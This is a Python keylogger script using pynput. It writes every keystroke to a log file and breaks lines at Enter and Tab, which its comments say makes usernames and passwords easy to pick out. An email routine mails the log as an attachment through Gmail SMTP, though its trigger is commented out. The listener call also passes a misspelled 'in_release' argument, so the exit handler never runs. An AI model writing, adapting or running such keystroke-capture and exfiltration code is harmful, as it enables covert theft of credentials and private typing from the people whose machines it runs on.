import pynput

from pynput.keyboard import Key, Listener


import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# initialization variables
count = 0 # standard counter
keys = [] # a list that will store the key inputs

## Make it so that the keylogger can be ran on one 
## machine and output the log file to another machine

# a function that is executed when a key is pressed 
def on_press(key):
    global keys, count

    # add pressed key to the list and print out which 
    # key was pressed
    keys.append(key)
    count += 1
    #print(" {0} pressed ".format(key))

    # when the count is greater than or equal to 5
    # reset the count, write to the text file, and
    # reset the keys list
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

    # Calls the email function when an esc key is pressed.
    # This was commented out because I wasn't able to figure 
    # out a way to do it without either hardcoding my password
    # or for the Keylogger to record my password. 
    #if key == Key.esc:
    #    email()

# function that writes the key list to the output file
def write_file(keys):
    with open("log.txt", "a") as f: # w = write, a = add?
        for key in keys:
            #remove the ' around every input
            k = str(key).replace("'", "").replace("Key.", "")
            
            # Using the Enter or Tab key could mean that 
            # someone is typing a username and/or password. 
            # This will help a team member easily identify them
            if key == Key.enter or key == Key.tab:
                f.write("\n")
            # Keylogger recognizes uppercase characters so having
            # the shift in the output file is unecessary
            elif key == Key.shift or key == Key.shift_r:
                continue
            else:
                f.write(k + " ")

# Should exit the program when an Esc key is pressed
def on_release(key):
    if key == Key.esc:
        return False

def email() :
    subject = "An email with attachment from Python"
    body = "This is an email with attachment sent from Python"
    sender_email = input("Enter your email that you will send the file from: ")
    receiver_email = input("Enter the email that you will send the file to: ")
    password = input("Enter the password to your email: ")

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails
    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = "log.txt"  # In same directory as script

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
    

# Listens in on the keyboard inputs and executes the functions 
# on_press and on_release when a key is pressed
with Listener(on_press=on_press, in_release=on_release) as listener:
    listener.join()



